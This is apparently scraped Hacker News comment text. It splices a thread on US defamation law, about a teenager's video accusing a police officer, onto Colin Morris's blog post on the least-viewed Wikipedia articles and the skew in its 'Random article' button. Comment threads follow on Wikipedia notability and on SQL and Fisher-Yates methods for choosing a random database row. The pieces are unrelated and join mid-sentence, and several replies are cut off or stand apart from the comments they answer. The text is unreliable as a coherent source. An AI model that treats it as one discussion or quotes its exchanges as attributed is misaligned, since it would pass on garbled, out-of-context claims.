wasn&#x27;t negligence.Verifying a article about the thing existed while misrepresenting that thing is likely not negligence unless that misrepresentstion was extreme.Certainly \"killed his girlfriend\" would be negligent but if you misunderstood the thing in a minor way that isn&#x27;t negligence just because you are wrong.(To be clear the statement was certainly objectively false for multiple reasons) reply Hizonner 15 hours agorootparentSo you&#x27;re saying that a reasonable person similarly situated to this 19-year-old might be sure enough that \"is under a protective order\" equals \"beat the shit out of his girlfriend\" that they would allege the latter in public without further verification?... and it&#x27;s not a \"minor\" misunderstanding. The accusation is grave and the distinction is at the center of it. reply Guvante 10 hours agorootparentDo you know how defamation laws work in the US?Would you assume a viral video contained accurate descriptions of legal procedures?Heck if he hadn&#x27;t said convicted it would be protected speech. The US protects \"I bet you X beats his wife\". reply Hizonner 7 hours agorootparentYes, I do. And while the US protects \"I bet you X beats his wife\", it does not protect \"X beats his wife\".And \"accurate descriptions of legal procedures\" have nothing at all to do with the most serious allegation. The serious allegation is the beating, not the conviction.I don&#x27;t know exactly what the kid said, and the case is probably going to turn on really close parsing of both his words and the manner and context in which he presented them.If he baldly said \"this guy beat the shit out of his girlfriend\", then he made a statement of fact. Not a statement of opinion. Not \"from what he did to me, he seems like the type\". Fact. Even if the cop had truly been convicted of, say, battery as part of domestic abuse, the kid would have had no way of knowing exactly what that battery consisted of. Saying the cop had \"beaten the shit out\" of his girlfriend would still have been speculation on the kid&#x27;s part, regardless of any conviction, let alone a protective order.There are no complicated legal technicalities there. The kid had no knowledge of the detailed facts of the domestic abuse case, and he knew he had no knowledge of the detailed facts. He wasn&#x27;t only ignorant of the legal finding. He was ignorant of what actually happened.It is negligent to present your speculations as facts. Negligence means not exercising the care expected of a reasonable person in a similar situation. Pulling something out of your ass and presenting it as true is not reasonable care. It was done in a video after the fact. He had time to reflect, so there&#x27;s no possibility of mistake \"in the heat of the moment\". And there&#x27;s no \"I did it because I&#x27;m an idiot\" escape from being found negligent, either. People are often negligent because they&#x27;re idiots.Now, if he had said \"the cop was convicted of domestic abuse, which I assume must mean that he beat the shit out of his girlfriend\", then he would have been presenting a reason for his conclusion. In that case, so long as didn&#x27;t suggest that that wasn&#x27;t his only reason, the truth of the conclusion would cease to matter. He wouldn&#x27;t be considered to be presenting \"the cop beat his girlfriend\" as fact; he&#x27;d be presenting it as an inference to be drawn from the fact of the conviction. Then the audience would be expected to be able to make their own determination about whether that inference followed from the presented fact.At that point, the question would be whether the kid was negligent in claiming that there was a conviction, because that would be the actual statement of fact he&#x27;d be offering. You might get away with claiming that was a mistake, but before you get there you have to show that he made it clear to the audience that the \"conviction\" was the reason he said that the cop had \"beaten the shit out of\" his girlfriend.Then you&#x27;d have to argue that he couldn&#x27;t be expected to know the difference between a restraining order and a conviction. Which is still not exactly open and shut, because a reasonable person might go find out before publishing a video like that. Not taking that reasonable care might make the statement about the conviction negligent and therefore defamatory. Because in fact reasonable people a lot younger than 19 tend to know the difference. A complete moron is not a reasonable person.Or he could have done both: \"The cop beat the shit out of his girlfriend, and of course that led to his being convicted\". In which case there&#x27;d be two statements of \"fact\", each of which could be considered separately. reply Guvante 3 hours agorootparentFeel free to research this legal topic at all, if you are going to talk that much about it.Including the definition of reasonable person, negligence, as well as the tests involved in a defamation suit. replyboomboomsubban 18 hours agorootparentprev>After all colloquially how else do you define domestic abuse?The article doesn&#x27;t mention what she got the protective order for, and there are several possible reasons that do not involve any physical abuse.

Knowing the statements to be false is one of them, but then there is intent and motivation as well as actual damages.The reason that intent matters is that I could say something like: \"Jeff Bezos is the type of guy that murders cats for fun.\"The above is an opinion that is using colourful language. However, it COULD be construed as a statement of fact. So if Jeff Bezos* wanted to sue me for defamation, he would have to make the case that I was making a statement of fact which I not only knew to be untrue, but that I also knew was likely to cause reputational harm that would lead to financial damages.* - And I&#x27;m asking to put aside the fact that Bezos is a public figure which raises the bar even higher, since people are more likely to talk about public figures and thus it is more likely and reasonable to get the facts wrong, to share personal opinions in ways that could be confused as factual statements and it is much less likely to cause the individual damages since most reasonable people kind of \"get\" this. reply Hizonner 18 hours agorootparentIn the US, you can get hit for defamation even of a public figure if you made the statement with \"reckless disregard for its truth or falseness\". You don&#x27;t have to know for sure that it&#x27;s false. Either knowingly lying or \"reckless disregard\" is \"actual malice\".Private citizens need to prove actual malice to collect punitive damages, but mere negligence is enough for compensatory damages. That&#x27;s for knowledge about the statement itself; I&#x27;m not sure what you have to know or intend about how much damage you&#x27;ll do.That&#x27;s constitutional standards; there may be state-to-state variations that impose more conditions.On edit: corrected; even for a non-public figure, it needs to be negligently false, so having taken reasonable steps to verify it should immunize you.

In this case it&#x27;s different, because the accuser was arrested by the police so the police did have the opportunity to rape him. Since that opportunity actually existed, I don&#x27;t think the claim is obvious hyperbole.I think nobody would believe the claim in the context of xbox live, but many people are inclined to believe it in the context of an unlawful arrest. Even one of the replies to my first comment about this seems to believe the claim. (He&#x27;s now been flagged for this. What guideline did he violate? I hope he wasn&#x27;t flagged because his perspective lends credence to my perspective that accusing cops of raping you after a baseless arrest is not obvious hyperbole.) reply porkbeer 18 hours agorootparentprevAnd our poor mothers! reply etchalon 19 hours agoparentprevIt wasn&#x27;t a \"false claim of rape\".

Before people say \"nothing could possibly justify\", consider what might have happened between 14:26 and 14:31 and 14:50-14:57, and 15:44-16:33, which is literally the entire premise of the arrest (and omitted from the video). reply Clubber 16 hours agoparent [–] The full body cam footage is public record and has been widely discussed by cop watching channels. reply acyou 15 hours agorootparent [–] Is that true?

    "originBody": "colin_morris Blog Toys About In search of the least viewed article on Wikipedia May 26, 2022 Wikipedia sure is popular. The most popular articles in a given week routinely get millions of views. But with 6 million plus articles, Wikipedia has plenty of room for articles about topics which are profoundly obscure, even downright boring. I should know, I’ve written dozens of them! Some of what I consider to be my finest contributions to Wikipedia are lucky to get a couple of views per day, for example: The Hobby Directory Bank note reporter Minimizer Of my creations, the least popular seems to be Sunday reading periodical, an article about a Victorian magazine genre which averages around a dozen views per month. Are there articles with even less popular appeal than that? Though Wikipedia page view data is publicly available (as a massive raw data dump, and through an API), there’s unfortunately no easy way to sort out the least viewed pages, short of a very slow linear search for the needle in the haystack… A smaller haystack As a starting point, I grabbed 2021 pageview data for a random sample of about 32,000 Wikipedia articles. Maybe the properties of the least viewed articles in the sample will lead us to some heuristics we can use to narrow our search for the least viewed articles. Here’s what the distribution of views looks like for that sample. I’ve used a logarithmic scale, since the values are widely spread out. The median article gets a little under 1,000 views annually. The average is around 13,000, thanks to the long tail. We have almost 100 articles in the sample whose total views in 2021 are in the single digits(!). Here’s a peek at the first few: Weimer Township (3 views) Goleh-ye Cheshmeh (4 views) Governor Terry (4 views) But these are disambiguation pages - navigational aids which link to similarly named articles, but which aren’t themselves “real” articles, at least for our purposes. And in fact, all of the 50 least viewed pages in our dataset are disambiguation pages - they seem to have a notably lower floor on their pageviews than other articles. After filtering out disambiguation pages, we’re left with a small handful of articles with single-digit annual views (ranging from 7 to 9): Erygia sigillata, a moth species Hilarigona obscurata, a fly species (apparently aptly named) Loxocrambus hospition, a moth Makhoshin, an Iranian village Bojerud, a surname Scrobipalpula crustaria, yet another moth These obscure 2 or 3 sentence stubs average less than one view per month! That figure is so small, I suspect most or all of those might come from readers hitting the “Random article” button. This would help explain why the least viewed pages in our sample are all disambiguation pages - the “Random article” button was coded to ignore disambiguation pages starting in 2015. There’s an effective way we can test this hypothesis. And if it’s true, it will give us an important clue for finding the least viewed article on Wikipedia. Interlude: how the “Random article” button works Here’s a dark secret about Wikipedia: due to some peculiarities in its implementation, the “Random article” button isn’t as random as you might think. Whenever an article is created on Wikipedia, it’s assigned a random number between 0 and 1 (stored in the database as a field called page_random). As a toy example, suppose our encyclopedia has just 5 pages, with the following page_random values: List of longest fish: 0.15 Musca depicta: 0.2 Cow Tools: 0.35 Fox tossing: 0.81 List of presidents of the United States with facial hair: 0.96 When someone hits the “Random article” button, the server generates a random number between 0 and 1. ASCII archer by jah/SSt via asciiart.eu. Let’s say our drunken archer’s arrow randomly lands at 0.29. The server will then search for and return the article in the database with the next-highest page_random value after 0.29. In this case, that’s Cow Tools. ASCII arrow: own work. As you might have surmised, this is not exactly a “fair” process. There is only a small range of values that will get us to Musca depicta: those between 0.15 and 0.2 (represented by the orange region above). It will only come up about 5% of the time, whereas Fox tossing will come up 46% of the time. The probability of a given article being landed on is equal to the size of what I’ll call its random gap: the difference between the article’s page_random value and the next-lowest page_random value in the database. In the diagrams above, the size of each article’s colored rectangle corresponds to its random gap. If the random article button is responsible for most of the pageviews for the project’s least popular articles, this leads to a couple testable predictions: That the least viewed articles will have unusually small random gaps That there is a (weak) correlation between random gap size and pageviews. This correlation should be most apparent when looking at the least viewed articles. Are the least viewed articles in our sample “unlucky”? Since there are around 6 million Wikipedia articles, the average random gap must be about 1/6,000,000, or 1.67e-7 in scientific notation. How big are the random gaps for the least viewed articles in our sample? The least viewed article in the sample, Erygia sigillata, has a page_random value of 0.500764585777. The article Katherine Hanley is right on its tail with a value of 0.500764582314, which is just 0.000000003 less, or 3e-9 in scientific notation. This is 98% smaller than the average random gap. In other words, Erygia sigillata is an extremely unlucky article as far as the “Random article” button is concerned! It’s 50 times less likely to be landed on than an average article. The random gaps for the 5 other articles in our sample with single-digit annual views are: 3e-9, 9e-9, 8e-9, 4e-9, 8e-9, 2e-8. All about an order of magnitude smaller than average. Quite a strong pattern! Is there a correlation between random gap and views? In the grand view of our sample of 32,000 articles, it seems like a wash: (If anything, it might look like articles with smaller gaps get more views, but this is just an artefact of the fact that most articles have gaps which are close to the average.) But we predicted that random gap will only have a noticeable effect on the floor of pageviews. Let’s do an extreme zoom-in on the very bottom of the plot, looking only at articles with less than 200 annual views: An even clearer picture emerges if we limit our analysis to articles which are a priori probably uninteresting, such as short articles about moth species (sorry, entomologists). Here’s a scatterplot of random gap vs. total views in 2021 for all ~1,500 pages in Category:Phaegopterina stubs: This must be how those scientists felt when they first saw a graph of the cosmic microwave background radiation! (To get a sense of how coherent this pattern is, here is what the same graph would look like under the null hypothesis of no association between random gap and page views. I synthesized this by randomly permuting the pageview values in the dataset.) The least popular articles of 2021 Based on our findings above, the least viewed articles on Wikipedia are not going to be merely about topics with little popular interest - they must also be “unlucky” in the sense of having very small random gaps. We can considerably narrow our search for the least viewed articles of 2021 by limiting our analysis to pages with small random gaps. I set a threshold of 1.7e-8, or about 1/10th of the average gap size. Of these 600,000 least lucky articles, all received at least a few views in 2021. The booby prize for least popular article of 2021 is shared by two articles which received exactly 3 probably-human pageviews: Trichromia phaeocrota (random gap: 4e-9) Opharus corticea (random gap: 1e-9) If you guessed that these are both moth species, you would be right. Patterns in unpopular articles You can check out a larger leaderboard of the 500 least viewed articles here. The list is remarkably consistent in its subject matter: A significant majority of them are about species or other taxons of insects (plus 17 gastropods, and one fungus). The next most common category is obscure geographical features, especially (for some reason) towns in Iran and Sri Lanka. My favourite of these is the deliciously laconic Kälberbuckel. One other recurring genre are set index articles like C24H31FO5, Dottley, Sukmanovka, and Great polemonium. (A set index article is a page which looks and functions like a disambiguation page but isn’t, because of reasons.) There are a small number of articles not falling into the previously-mentioned categories. Some feel like living fossils from an earlier age of Wikipedia when standards of demonstrated notability were looser. It’s a little questionable whether articles like DMZ//38 or EuroNanoForum 2009 could weather a deletion discussion today. Why so many moths? The Wikipedia community’s policies and practices around which articles are “notable” (worthy of an article) and which get deleted have a healthy pragmatism to them. If Wikipedia allowed articles about anything, we would see a lot more articles about obscure garage bands, businesses, and living people. The authors of these articles would not be disinterested scholars writing with the goal of expanding the largest collection of knowledge on the internet. Rather, we would get a lot of editors with conflicts of interest, using Wikipedia for publicity, profit, or to settle a score. Before the community tightened up its notability criteria, it was not so uncommon in the very early days of the project to see blatant autobiographies, advertisements, or attack pages. Here are just a few examples based on real articles from Wikipedia’s early years which have since been deleted (names and details have been altered to protect the “innocent”): Mian Amir Rashid is the youngest elected chairman of Pakistan chapter of Mensa. He assumed the post in 2001 at the age of 23. Under his tenure Mensa has grown very rapidly and now operating in 5 cities of Pakistan including Karachi, Lahore & Capital Islamabad Mr. Rashid is a Public Relations & Marketing consultant by profession. Union Cab is a cab company in Saint Paul, MN. They can be reached at www.unioncab.biz or 555-242-2000. –Sam Trevor Shelby is a Canadian businessman and robotics engineer. He is the founder and CEO of Polybonk. Mr. Shelby and Polybonk were the subject of a Human Rights Tribunal of Quebec inquiry alleging discrimination in employment practices.[1] During the course of the inquiry, Mr. Shelby’s professional qualifications were called into question.[2] Shelby also created controversy in a highly publicized case of road rage. According to the police report, he menaced another driver with a tennis racquet while hurling obscenities.[3] The Ghosties are a small band from Melbourne. Nick sings and plays guitar, Sumeet plays bass if he hasn’t been naughty, Clark plays guitar properly and Kris makes the band seem good on the drums. With their trademark songs Dear Robby, and Firecracker, this band are very cool, and their unmeasurable spontaneity is the stuff of legends. Learn more about The Ghosties on their website. The Forum should contain the dates and times of any upcoming gigs. Over time, Wikipedia has developed a strong immune response against those who would try to use it for nefarious purposes, in the form of strict sourcing requirements for the sorts of topics shown above (e.g. living people, companies, bands). The existence of, say, the Union Cab company may be verifiable via primary sources, such as local business listings, but that’s not enough to secure it a place on Wikipedia. It needs significant coverage in multiple independent secondary sources. It makes sense then that we see almost no articles about these sorts of topics in the bottom 500. Any subject that meets these strict sourcing requirements is probably going to be of interest to someone beyond just those surfing the “Random article” button. On the other hand, no-one has yet come up with a way to monetize a topic like Pseudoneuroterus mazandarani or use it to push a contentious point of view. Hence articles about species and populated places are generally not deleted, even if the topic is only weakly sourced – and most of our unpopular articles are weakly sourced, often having just a single citation to a primary source such as a database or gazetteer, or a passing mention in a single book or journal article. Because the bar for these topics is so low, many of these articles feel a little soulless, having the appearance of being popped out via a mechanical (perhaps even fully automated) process. For example, the 12-word stub Pottallinda (5 views last year) was created on 18 January 2011 by User:Ser Amantio di Nicolao, who happens to be the most active editor in all of Wikipedia (as measured by number of edits). Within 60 seconds of creating this page, the same editor also created Polmalagama, Polommana, Polpitiya, Polwatta, and dozens of other substantially identical articles. But hey, these hyper-obscure, tiny articles aren’t doing any harm (other than maybe disappointing the dozen people per year who land on them, rather than a more interesting fleshed-out article, when hitting the “Random article” button), and they lay a groundwork that other editors might build on in the future. The pageview data used in this post, as well as the code used to scrape and analyse it, is available on GitHub here.

Hence articles about species and populated places are generally not deleted, even if the topic is only weakly sourcedThis is not why this happens on Wikipedia; sourcing is a factor, but notability derived from the nature and quality of the cited sources is the most commonly used criteria to delete articles.For example, Wikipedia once had a notability guideline that a person who completed in a sport at the international level was probably notable, so a weakly sourced article on, say, a footballer with a single international cap could be notable enough to avoid deletion.But then editors removed this guideline and fell back onto the general notability guideline (GNG), which is much stricter for people: substantial biographical coverage from reliable mainstream sources at the national level. Match reports don&#x27;t count (too routine), no local interviews (too primary), no enthusiast publications (not reliable enough), etc.Of course, this meant that hundreds of stubs and dozens of full articles about women&#x27;s international footballers would never meet GNG due to a relative lack of mainstream media coverage, even if they won a World Cup. So all it took was one editor to decide to do almost nothing but flag hundreds such articles since the opening of the Women&#x27;s World Cup this summer, almost all of which were deleted.So it&#x27;s not this reason that keeps moths and places:> On the other hand, no-one has yet come up with a way to monetize a topic like Pseudoneuroterus mazandarani or use it to push a contentious point of view.But rather, very different standards of notability are why there are more low-traffic articles on items and places that can&#x27;t sue Wikipedia editors for libel. reply wavemode 18 hours agoparentIt&#x27;s really funny - just this morning I was reading the Wikipedia article for Interstate 94, which led me to the WikiProject that maintains it (US Roads) and an open letter they wrote a month ago that they were leaving Wikipedia and starting their own wiki, because of how painful it&#x27;s been having their articles deleted due to arbitrary notability guidelines.https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Wikipedia:WikiProject_U.S._Roa... reply starkparker 17 hours agorootparentA couple points on their complaints: you _can_ cite primary sources, but you can&#x27;t _rely_ on them. That&#x27;s beyond notability altogether. It&#x27;s still relevant to why Roads would want to fork (there aren&#x27;t a lot of news publications doing feature stories on random highways) but it comes down to informal nonenforcement giving way to a few hardasses flagging everything they can as soon as their attention is turned toward a particular domain.Because there&#x27;s very little effort required to flag articles for deletion, and the burden to keep is often on the contributors doing research on a 7-day timeframe if there are even just one or two editors supporting deletion, most times the contributors eventually give up running the research treadmill and the content gets deleted anyway.And WP:GEOROAD is a subject-specific notability guideline, like WP:NSPORT is. Those aren&#x27;t immutable; NSPORT was fundamentally changed in 2022,[1] and those changes now justify all these deletions of international footballer articles created before. If the Roads editors have all left, there&#x27;ll be little or no opposition to changing WP:GEOROAD,[2] and deletions of that content from WP could get done even faster.1: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Wikipedia:Village_pump_(policy...2: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Wikipedia_talk:Notability_(geo... - and I see some of the editors who participated in NSPORT-related deletions this summer also in there advocating to change GEOROAD and make it more explicitly defer to GNG, and therefore easier to delete articles. reply gregmac 9 hours agorootparent> Because there&#x27;s very little effort required to flag articles for deletion, and the burden to keep is often on the contributors doing research on a 7-day timeframe if there are even just one or two editors supporting deletion, most times the contributors eventually give up running the research treadmill and the content gets deleted anyway.Pretty much sums up the problem with every community-run moderated site. It directly leads to the downfall because contributors get discouraged and leave, and eventually all that&#x27;s left is people with the same view as the heavy-handed moderators. Having hours of work wiped out from editors&#x2F;moderators who&#x27;ve spent less than a minute on it sucks.Stackoverflow is another notable example of this. reply a3_nm 16 hours agorootparentprevAs much as I think that Wikipedia notability guidelines are way too strict, I&#x27;m wondering -- is it necessarily a bad thing for editor communities to split off and create separate specialized wikis? As long as the other wikis are also under a free license (here, CC BY-SA 4.0), you can always import back the articles into Wikipedia. So maybe it can be a useful way for communities to \"incubate\" articles? reply eterm 16 hours agorootparentIndeed it&#x27;s not a bad thing at all. I remember in the early days of wikipedia it seemed like every single Pokemon had their own article while actually notable real life topics had scant information.Migrating all that cruft to a separate pokemon wiki was an improvement for everyone, no matter how \"notable\" you think Beedrill might be, it doesn&#x27;t need it&#x27;s own separate wikipedia article. With a separate wiki, Pokemon fans can go into as much depth and lore as they like.Personally I think the criteria for fictional things should be even stronger. There ought to be an article about the work of fiction itself, but not articles about fictional characters or events unless they&#x27;re notable outside of the work of fiction.This keeps wikipedia about facts, not fictional canon.e.g. Pikachu derves a separate article, Charmander does not.To elaborate further, the Charizard article has a \"Physical characteristics\" section.It&#x27;s a anime &#x2F; computer game. It&#x27;s not a physical being, so any \"physical characteristics\" is not factual information, it&#x27;s fictional information. Wikipedia does a poor job at separation of fact and fiction in articles about fictional beings. reply andrewla 14 hours agorootparent> no matter how \"notable\" you think Beedrill might be, it doesn&#x27;t need it&#x27;s own separate wikipedia articleThis has always been my sticking point with deletionist thinking. Why doesn&#x27;t it need it&#x27;s own separate wikipedia article? What&#x27;s the harm in it? Are we worried that people will start treating Charizard as a real creature?Where I see the value of notability criteria it is mostly in preventing vanity articles. Beedrill, presumably, is of general enough interest that people are willing to contribute and reference the information. Why isn&#x27;t that enough? reply fsckboy 9 hours agorootparentI wish they&#x27;d give all the fantasy stuff (character in tv show, animated character, etc) something like a different background color or theme that essentially says \"this is for people who want to document fantasy worlds\". reply registeredcorn 15 hours agorootparentprevI&#x27;m sure there&#x27;s some very good reasons for it, but what exactly is the reason why there cannot be articles for very niche things like articles for each Pokemon individually listed on Wikipedia? I find the idea of having a complete tome of everything to be an incredibly neat idea!At a guess, it&#x27;s probably something like practical restraints around \"not enough people monitoring for quality\", or the fact that the hard drive space to save all of this information is not free and unlimited, or that simply, it might be better served by niche communities who will be devoted to caring far more about such specific topics?I just find it frustrating that there isn&#x27;t a kind of...ultra, super mega colossal set of all human knowledge of everything stored under a single digital roof. I suppose that ideal itself probably isn&#x27;t practical for the reasons mentioned...it just seems so neat in concept. Just one place for everything. reply oxguy3 8 hours agorootparentWikipedia articles are kinda meant to be a broad view of a subject that is approachable to a general reader with no prior knowledge. You can write an article about Pikachu or Squirtle that is relevant to this type of reader. Can you really write such an article about Dartrix or Groudon?Granted, this is also a problem with the obscure moth species articles. I think the moth species articles survive because no one really cares enough to start the crusade against them. When we used to have every Pokemon, it was a common line in deletion discussions to say \"well if every Pokemon has an article, why can&#x27;thave one too?\" -- I think some people eventually got fed up and decided it was worth putting in the work of figuring out what the notability standards should be. What I&#x27;ve learned from a long time of editing on Wikipedia is that often, things are the way they are not because it&#x27;s the best way, but because the project has a lot of inertia -- it&#x27;s a lot of work to make a big change happen.The concept you long for sounds a little bit like Wikidata. It&#x27;s much less in-depth than Wikipedia, and just describes its subjects as structured data instead of with prose, but the notability bar on Wikidata is much much lower. Every Pokemon, every scientific article, every book, every village, every athlete, etc is generally in scope. reply timeinput 14 hours agorootparentprev> because I don&#x27;t want it that way.- some editor probablyIn my handful of encounters trying to contribute to wikipedia it&#x27;s always been such a frustrating experience.\"not enough people monitoring for quality\" is one way to put it, but I&#x27;ve often found it to be one very zealous person monitoring for their idea of quality.

I&#x27;ve heard of people who were being quoted updating the context to more accurately reflect what they were saying and having the changes reverted. As if the person who said the thing being quoted doesn&#x27;t know what they meant. Often because it didn&#x27;t meet some guideline or another but more often than not because one overzealous editor has decided that the page being edited is \"their page\".I learn the truth more from perusing the edit history or talk pages than from ever reading the page itself. Also despite claims of neutrality it&#x27;s amazing how often pro-communist articles are heavily maintained almost exclusively by diehard self-proclaimed Marxists making politically biased edits.Exhibit A: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Talk:Holodomor reply sandworm101 9 hours agorootparentKings of their own tiny virtual mountains.

If you fork Wikipedia then you lose out on the resources.Without that, you do have a \"forkophobic\" culture which is why you get this \"governance orgy\" -- the notability guidelines and so forth. But the difference is, Cantrill&#x27;s software examples expect the software to have some sort of editorial control, so if the Linux or Apache foundations take on some project it&#x27;s because it&#x27;s used by thousands or millions of people and they don&#x27;t really take kindly to \"oh yeah upstream was vandalized by someone who came in and just made every request to the Apache server return &#x27;HTTP 499 BUTTS BUTTS BUTTS&#x27;.\"In Wikipedia you get this strange direct democracy by \"whoever happened to show up.\" Deletion votes are often done with like, 20 votes or less of just random passersby.

They&#x27;ve already implemented technical improvements on AARoads, like better and newer road maps. The potential is there.It&#x27;s often a bad thing in practice, much like how splitting off entirely separate social networks for specific subjects is often a bad idea. If there aren&#x27;t enough people or activity, interest wanes. If the project relies on one or two heavily active editors, it collapses when they&#x27;re unavailable. If you never hit critical mass for SEO or can&#x27;t&#x2F;don&#x27;t know how to promote your content, all the work is done in a vacuum and everyone sees the Wikipedia stubs over your stuff anyway.Fandom (as in the company), as awful as it is, largely exists by virtue of participation in the subjects where there&#x27;s enough interest to facilitate it; the mass wiki-farm infrastructure gives them enough of a SEO boost to dominate even some of the wikis that fork off of Fandom to escape its policies.> you can always import back the articles into Wikipedia. So maybe it can be a useful way for communities to \"incubate\" articles?Developing an article on a separate wiki has additional technical and administrative overhead.CC BY-SA requires attribution. Wikipedia attributes contributions by article history. The only way to import article history is via Special:Import. You have to be an admin or have import rights to use Special:Import on Wikipedia.If you can clear all those hurdles, then in theory you can import changes with the required attribution from another wiki. But if the imported changes conflict with changes made in parallel on Wikipedia, resolving them can be very contentious, especially if any of the editors involved disagree on the resolution. Or the import might fail, because Special:Import isn&#x27;t particularly robust.And as the forked wiki admin, do you decide to set up scheduled imports _from_ Wikipedia to keep up with upstream? These forks often split because Wikipedia is deficient in some way beyond just editing the text. AARoads&#x27; fork&#x27;s use of improved maps, for instance, would probably break the article on Special:Import because it looks like they use different wiki templates and modules. reply riwsky 7 hours agorootparentprevRoads fork?

Perhaps, perhaps not.If I wanted to construct a set of policies that drove traffic to another site, I would make them quite like Wikipedia has now e.g. Wikipedia is not a gamers manual.

The only thing I&#x27;d add is that Wikipedia is not a monolithic entity, and whilst you&#x27;re probably referring to English Wikipedia (not unreasonable, given this is HN), my understanding is that other versions of Wikipedia have their own, sometimes quite different notability requirements. reply hammock 16 hours agoparentprevI was looking up Gall Wasps last week... :) reply jovial_cavalier 18 hours agoparentprevI don&#x27;t believe this is actually enforced. I created a small website called \"Man of the Hour\", which filtered Wikipedia with the Wikidata code Q8441 (man - male adult human), selected a random entry every hour, and displayed it.I would go there a few times a day, and noticed that almost every single article it gave me was some random amateur athlete, with only a results page as a source.[1] https:&#x2F;&#x2F;www.wikidata.org&#x2F;wiki&#x2F;Q8441 reply starkparker 18 hours agorootparentI gave an example of enforcement. It takes an editor to flag the article for deletion. Chances are, like the women&#x27;s footballer stubs up until an editor decided to go through all of them, there hasn&#x27;t been an editor motivated to do so. reply teachrdan 17 hours agorootparentTo say the quiet part out loud: It only takes one misogynist to go out of their way to flag hundreds of pages of women athletes. No one is out there flagging men&#x27;s pages to delete for the same reasons.I was at an early Wikipedia meetup and a woman editor told me that women porn stars were more likely to get (and keep) a profile page than a woman sci-fi author. It&#x27;s pretty clear that Wikipedia&#x27;s quality has been diminished by this level of misogyny. reply starkparker 17 hours agorootparentThere&#x27;s a part of that, but the women&#x27;s stubs are also unjustifiable because of the foundational mandates around sourcing and notability.Once upon a time, subject-specific notability guidelines carved out exceptions by arbitrarily defining typical notability for a given subject at a lower standard than general notability. Those exceptions are being rolled back toward the higher bar of general notability.When a women&#x27;s sport gets 1&#x2F;10th the mainstream coverage of the men&#x27;s equivalent, there&#x27;s no policy justification to have articles under general notability. Even if Wikipedia was capable of banning every editor whose focus is in deleting articles about women (and it&#x27;s sincerely not capable of banning any of them), the core policies themselves would justify not creating articles — especially for almost all who played in the decades before the recent boom in coverage and investment — because the coverage wasn&#x27;t and isn&#x27;t there. reply Retric 15 hours agorootparentThe issue here not specifically notability or a lack of articles. In most cases someone could find the sources but they would need to do so really quickly while flagging hundreds of pages is trivial for an editor with a grudge.It’s that time pressure gives a great deal of power to anyone with an agenda of any kind. reply rendall 15 hours agorootparentprevThe comparison wasn&#x27;t notable male athletes versus non-notable female athletes.

It’s guaranteed to produce permanent biases in the randomization and lots of path dependence in how individual articles’ chances change over time. Picking a random int from 1 to N is not rocket science.This makes me wonder if there isn’t some intentional weighting going on, e.g. certain favored pages get space in front of them cleared out so they’re more likely to pop up. reply crazygringo 18 hours agoparentIt is shocking, but what&#x27;s more shocking is that doing it correctly is kind of rocket science. MySQL simply isn&#x27;t built for picking a truly random row performantly (I&#x27;m not sure if any of the common relational databases are?).If you do something naive like \"ORDER BY RAND() LIMIT 1\" performance is worse than abysmal. Similarly, doing a \"LIMIT 0 OFFSET RAND() * row_count\" is comparably abysmal. While if you do something performant like \"WHERE id >= RAND() * max_id ORDER BY id LIMIT 1\", you encounter the same problem where the id gaps in deleted articles make certain articles more likely to be chosen.There are only two \"correct\" solutions. The first is to pick id&#x27;s at random and then retry when an id isn&#x27;t a valid article, but the worry here is with how sparse the id&#x27;s might be, and the fact it might have to occasionally retry 20 times -- unpredictable performance characteristics like that aren&#x27;t ideal. While the second is to maintain a separate column&#x2F;table that includes all valid articles in a sequential integer sequence, and then pick a random integer guaranteed to be valid. But the problem with performance is now that every time you delete an article, you have to recalculate and rewrite, on average, half the entire column of integers.So for something that&#x27;s really just a toy feature, the way Wikipedia implements it is kind of \"good enough\". And downsides could be mitigated by recalculating each article&#x27;s random number every so often, e.g. as a daily or weekly or slowly-but-constantly-crawling batch job, or every time a page gets edited.You could also dramatically improve it (but without making it quite perfect) by using the process as it exists, but rather than picking the article with the closest random number, select the ~50 immediately lower and higher than it, and then pick randomly from those ~100. It&#x27;s a complete and total hack, but in practice it&#x27;ll still be extremely performant. reply munificent 17 hours agorootparentIf it were up to me, I&#x27;d implement something sort of like an online[0] Fisher-Yates shuffle:Add a column to the article database for \"random_index\". This gives each article a unique integer index within a consecutive range of 1 to N. To pick a random article, just pick a random number in that range using your favorite random number generator and then look up the row with that random_index value.The tricky part, obviously, is maintaining the invariant that random index values are (1) randomly assigned and (2) contiguous. To maintain those, I believe it&#x27;s enough to:1. Whenever a new article is created, give it random_index N+1. Then choose a random number in the range (1, N+1). Swap the random_index of the new article and the article whose random_index is the number you just rolled. This is the Fisher-Yates step that gives you property (1).2. Whenever an article is deleted or otherwise removed from the set of articles that can be randomly selected, look up the article with random_index N. Set that article&#x27;s random_index to the random_index of the article about to be deleted. This gives you property (2).[0]: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Online_algorithm reply crazygringo 17 hours agorootparentOh wow, yup that will do it. That was my second suggestion for what is \"correct\" but I never heard of your #2 suggestion, so I thought there would still be performance issues because you&#x27;d have to shift all the values above. I&#x27;m kind of annoyed now I didn&#x27;t know about this before... :)Yes, this should definitely considered to be the correct, definitive, performant solution then. Thank you!I think you&#x27;ll need a full table lock in the case of a race condition trying to do a remove and add at the same time, but that&#x27;s probably not usually going to be an issue? reply munificent 17 hours agorootparentActually, now that I think about it, step 1 isn&#x27;t necessary. You don&#x27;t actually need to shuffle the indexes since you always choose a random one anyway. It should be enough to just do the swap on deletes in order to keep the integers contiguous.> I think you&#x27;ll need a full table lock in case you&#x27;re ever trying to do a remove and add at the same timeYeah, I think you need some sort of locking to ensure N can&#x27;t be concurrently modified but I&#x27;m not a DB person, so I don&#x27;t know how to go about that. reply crazygringo 16 hours agorootparentYup, agreed on step 1. Basic autoincrement is perfectly fine, since you pick a random number at query time. reply jprete 13 hours agorootparentprevThanks to both of you for pointing out some quite good solutions to this problem. reply stcg 16 hours agorootparentprevThis is the nicest solution I&#x27;ve seen so far.I believe that for the operation of randomly sampling a single row, only the consecutiveness invariant is needed. The random permutation invariant is unnecessary, because the choice from the range (1, N+1) is random anyway.However, I can imagine the random permutation invariant being useful for other operations (although I can&#x27;t immediately think of one).EDIT: the random permutation invariant could maybe be useful for a list that can be displayed to the user.

